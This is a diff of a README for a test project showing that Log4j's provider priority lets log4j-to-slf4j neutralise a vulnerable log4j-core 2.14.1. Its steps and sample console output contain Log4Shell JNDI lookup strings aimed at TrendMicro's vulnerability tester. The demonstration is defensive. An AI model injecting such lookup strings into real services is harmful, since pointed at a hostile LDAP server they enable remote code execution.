@@ -27,30 +27,74 @@ This one is more subtle. Many applications are based on Spring Boot that by defa
 
 Not rarely, the `log4j-core` is also indirectly included on the runtime classpath by some application dependency. At the end, we have two available implementations (aka "providers") that can be used when the Log4j API is used directly.
 
-As per implemented on [Log4j's LogManager initialization code](https://github.com/apache/logging-log4j2/blob/a19ef9bceeaad862cfc0b50394a7f791d5e17b8c/log4j-api/src/main/java/org/apache/logging/log4j/LogManager.java#L115), only one provider is used, the one with higher priority. Luckily, `log4j-to-slf4j` has higher priority ([15](https://github.com/apache/logging-log4j2/blob/be881e503e14b267fb8a8f94b6d15eddba7ed8c4/log4j-to-slf4j/src/main/java/org/apache/logging/slf4j/SLF4JProvider.java#L26)) than `log4j-core` ([10](https://github.com/apache/logging-log4j2/blob/be881e503e14b267fb8a8f94b6d15eddba7ed8c4/log4j-core/src/main/java/org/apache/logging/log4j/core/impl/Log4jProvider.java#L26)), ultimately renegating any vulnerable `log4j-core` module into an "inert pathogen".
+As per implemented on [Log4j's LogManager initialization code](https://github.com/apache/logging-log4j2/blob/a19ef9bceeaad862cfc0b50394a7f791d5e17b8c/log4j-api/src/main/java/org/apache/logging/log4j/LogManager.java#L115), only one provider with higher priority is used. Fortunately, `log4j-to-slf4j` has higher priority ([15](https://github.com/apache/logging-log4j2/blob/be881e503e14b267fb8a8f94b6d15eddba7ed8c4/log4j-to-slf4j/src/main/java/org/apache/logging/slf4j/SLF4JProvider.java#L26)) than `log4j-core` ([10](https://github.com/apache/logging-log4j2/blob/be881e503e14b267fb8a8f94b6d15eddba7ed8c4/log4j-core/src/main/java/org/apache/logging/log4j/core/impl/Log4jProvider.java#L26)), ultimately renegading any vulnerable `log4j-core` module into an "inert pathogen".
 Again, we can conclude that:
 
 > Your application is also immune if it contains *both* `log4j-to-slf4j` and `log4j-core` in the runtime classpath.
 
-## Branches
+## Usage
 
-| Branch     | Test                                                           |
-|------------|----------------------------------------------------------------|
-| master     | Both `log4j-to-slf4j` and `log4j-core` are in the RT classpath |
-| only-log4j | Only `log4j-core` on the RT classpath                          |
+At API level, the test application uses both SLF4J and Log4j APIs. Similarly, in the runtime classpath both `log4j-core` and `logback-classic` are present.
+To prove the statements above, we just need to run application with and without `log4j-to-slf4j` in the RT classpath.
 
-For all branches, we're using the old, unpatched, Log4j v2.14.1. 
+Either way, it uses both APIs to log a message that would exploit the Log4Shell vulnerability using the TrendMicro's "Log4j Vulnerability Tester" to check if the ethical exploit has succeeded. 
 
-## How to run
+### Step 1: Open TrendMicro's tester page and get your JNDI snapshot
 
-First, build the application binary with:
+Open the [Log4j Vulnerability Tester](https://log4j-tester.trendmicro.com) page and copy the JNDI snapshot as highlighted below:
 
-```shell
-$ ./gradlew installDist
-```
+![](./images/get-your-jndi-snapshot.jpeg)
 
-Then run the application with no arguments to see the instructions:
+### Step 2: Running <u>without</u> `log4j-to-slf4j`
 
 ```shell
-$ ./build/install/log4j-test/bin/log4j-test
+$ ./gradlew run -Plog4shell --args 892610a5-2807-4a24-be67-dc5750c388ce
 ```
+
+The Log4j Tester page will display the results:
+
+![](./images/lo4j-tester-results.jpeg)
+
+In the console the application will output messages similar to:
+
+<pre style="background-color: #2B2B2B">
+<b>LOGBACK</b> 13:45:40.798 [main] INFO  main - Using SLF4J: ${jndi:ldap://log4j-tester.trendmicro.com:1389/892610a5-2807-4a24-be67-dc5750c388ce}
+<b>LOG4J</b> 13:45:40.806 [main] INFO  main - Using Log4J API: ${jndi:ldap://log4j-tester.trendmicro.com:1389/892610a5-2807-4a24-be67-dc5750c388ce}
+<i># ... followed by a long stracktrace ...</i>
+
+<span style="color: #61981D">Logging modules in runtimeClasspath:</span>
+<span style="color: #8D7D00">+--- ch.qos.logback:logback-classic:1.2.7
++--- ch.qos.logback:logback-core:1.2.7
++--- org.apache.logging.log4j:log4j-api:2.14.1
++--- org.apache.logging.log4j:log4j-bom:2.14.1
++--- org.apache.logging.log4j:log4j-core:2.14.1
++--- org.slf4j:jul-to-slf4j:1.7.32
++--- org.slf4j:slf4j-api:1.7.32</span>
+</pre>
+
+### Step 3: Running <u>with</u> `log4j-to-slf4j`
+
+If you omit the `-Plog4shell` the `log4j-to-slf4j` module will be included in the RT classpath,
+and you'll see how it can effectively neutralize the unsafe `log4j-core` module:
+
+
+```shell
+$ ./gradlew run --args 892610a5-2807-4a24-be67-dc5750c388ce
+```
+
+At the Log4j Tester page you won't see any message added to the "Results" pane and in the console you'll see messages like these:
+
+<pre style="background-color: #2B2B2B">
+<b>LOGBACK</b> 13:53:58.733 [main] INFO  main - Using SLF4J: ${jndi:ldap://log4j-tester.trendmicro.com:1389/892610a5-2807-4a24-be67-dc5750c388ce}
+<b>LOGBACK</b> 13:53:58.740 [main] INFO  main - Using Log4J API: ${jndi:ldap://log4j-tester.trendmicro.com:1389/892610a5-2807-4a24-be67-dc5750c388ce}
+
+<span style="color: #61981D">Logging modules in runtimeClasspath:</span>
+<span style="color: #8D7D00">+--- ch.qos.logback:logback-classic:1.2.7
++--- ch.qos.logback:logback-core:1.2.7
++--- org.apache.logging.log4j:log4j-api:2.14.1
++--- org.apache.logging.log4j:log4j-bom:2.14.1
++--- org.apache.logging.log4j:log4j-core:2.14.1
++--- <b style="color: goldenrod">org.apache.logging.log4j:log4j-to-slf4j:2.14.1</b>
++--- org.slf4j:jul-to-slf4j:1.7.32
++--- org.slf4j:slf4j-api:1.7.32</span>
+</pre>
